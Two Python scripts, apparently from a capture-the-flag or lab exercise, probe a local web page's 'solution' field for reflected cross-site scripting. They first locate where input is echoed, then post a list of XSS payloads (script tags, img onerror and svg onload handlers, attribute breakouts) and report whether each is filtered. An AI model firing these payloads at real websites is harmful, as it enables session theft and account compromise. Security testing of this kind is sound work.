import requests
import re

url = "http://127.0.0.1:33031/page"
param = "solution"

print("=" * 70)
print("STEP 11: Find where input actually reflects")
print("=" * 70)

# Send a unique marker and search entire response for it
marker = "XYZ_MARKER_999"
data = {param: marker}
resp = requests.post(url, data=data, timeout=10)

print(f"Looking for marker: '{marker}'")
print(f"Found in response: {marker in resp.text}")

if marker in resp.text:
    # Find context around it
    idx = resp.text.find(marker)
    context = resp.text[max(0, idx-100):min(len(resp.text), idx+100)]
    print(f"\nContext around marker:\n{context}")
else:
    # The marker isn't there - check if it was stripped/modified
    # Maybe spaces are removed?
    marker_nospace = marker.replace(" ", "")
    print(f"\nTrying without spaces: '{marker_nospace}'")
    print(f"Found: {marker_nospace in resp.text}")
    
    # Maybe it's encoded?
    import html
    print(f"HTML encoded: {html.escape(marker)}")
    print(f"Found encoded: {html.escape(marker) in resp.text}")

# Let's try finding any of our unique strings
unique_tests = [
    ("spaces_removed", "hello world", "helloworld"),
    ("case_preserved", "HeLLo WoRLD"),
    ("special_chars", "test!@#$%"),
]

print("\n" + "=" * 70)
print("Testing character preservation")
print("=" * 70)

for test_name, payload in [(u[0], u[1]) for u in unique_tests if len(u) == 2] + [(u[0], u[1]) for u in unique_tests if len(u) == 2]:
    data = {param: payload}
    resp = requests.post(url, data=data, timeout=10)
    
    # Check various forms
    if payload in resp.text:
        print(f"{test_name}: '{payload}' appears UNCHANGED")
    elif payload.replace(" ", "") in resp.text:
        print(f"{test_name}: '{payload}' appears WITHOUT SPACES as '{payload.replace(' ', '')}'")
    else:
        print(f"{test_name}: '{payload}' NOT FOUND in response")

# Full raw response analysis
print("\n" + "=" * 70)
print("Searching entire response for reflected content")
print("=" * 70)

# Send simple text
data = {param: "UNIQUE_TEST_STRING_12345"}
resp = requests.post(url, data=data, timeout=10)

# Search for any part of it
search_terms = [
    "UNIQUE_TEST_STRING_12345",
    "UNIQUE",
    "TEST",
    "STRING",
    "12345",
]

for term in search_terms:
    if term in resp.text:
        idx = resp.text.find(term)
        print(f"Found '{term}' at position {idx}")
        context = resp.text[max(0, idx-50):min(len(resp.text), idx+50)]
        print(f"  Context: ...{context}...")
        print()

if not any(t in resp.text for t in search_terms):
    print("NONE of the test strings were found in response!")
    print("\nFull response:")
    print(resp.text)
import requests
import re

url = "http://127.0.0.1:33031/page"
param = "solution"

print("=" * 70)
print("STEP 12: Analyzing reflection context for XSS execution")
print("=" * 70)

# The reflection happens after the form, looking like:
# <input type=text name=solution placeholder="Enter solution...">
# XYZ_MARKER_999
# </form>

# This means the reflected content is OUTSIDE any HTML tag, so it's just text content
# For XSS to work, we need to:
# 1. Close the current form/structure
# 2. Inject new HTML that will execute

# Let's test various payloads that try to create an executable context
payloads = [
    # Close form and inject script
    '</form><script>alert("XSS")</script>',
    '</form><img src=x onerror=alert("XSS")>',
    '</form><svg onload=alert("XSS")>',
    
    # Inject inside input field (try to break out of value attribute)
    '" onerror=alert("XSS") ',
    '"><img src=x onerror=alert("XSS")>',
    '"><script>alert("XSS")</script>',
    'test"><img src=x onerror=alert("XSS")><!--',
    
    # Attribute context breakout
    'value="test" onerror=alert("XSS")"',
    
    # Breaking out of the input tag
    '><img src=x onerror=alert("XSS")>',
    '/><img src=x onerror=alert("XSS")>',
    
    # Using HTML entities in breakout
    '&quot;&gt;&lt;img src=x onerror=alert(&quot;XSS&quot;)&gt;',
]

for payload in payloads:
    data = {param: payload}
    resp = requests.post(url, data=data, timeout=10)
    
    # Check if alert was triggered (error_star = alert detected)
    blocked = "error_star" in resp.text
    success = "new_star" in resp.text
    
    # Check what got reflected
    match = re.search(r'name=solution[^>]*>(.*?)</form>', resp.text, re.DOTALL)
    reflected = match.group(1).strip() if match else "N/A"
    
    # Check if payload appears in input attributes
    in_input = payload in resp.text and 'input' in resp.text[:resp.text.find(payload)]
    
    status = "BLOCKED (alert detected)" if blocked else ("NOT BLOCKED" if success else "UNKNOWN")
    print(f"\nPayload: {payload[:60]}...")
    print(f"  Status: {status}")
    print(f"  Reflected: {reflected[:80]}...")
    print(f"  In input tag: {in_input}")

# Check the input field structure more carefully
print("\n" + "=" * 70)
print("STEP 13: Analyzing input field structure")
print("=" * 70)

payload = 'TEST_VALUE'
data = {param: payload}
resp = requests.post(url, data=data, timeout=10)

# Find the input field
input_match = re.search(r'<input[^>]*name=solution[^>]*>', resp.text)
if input_match:
    print(f"Input field: {input_match.group(0)}")
    
    # Check if there's a value attribute
    if 'value=' in input_match.group(0):
        print("  -> Input has VALUE attribute")
    else:
        print("  -> Input DOES NOT have value attribute")

# Show the full reflection context
print("\nFull reflection context:")
context_match = re.search(r'<input[^>]*name=solution[^>]*>.*?<\/form>', resp.text, re.DOTALL)
if context_match:
    print(context_match.group(0))
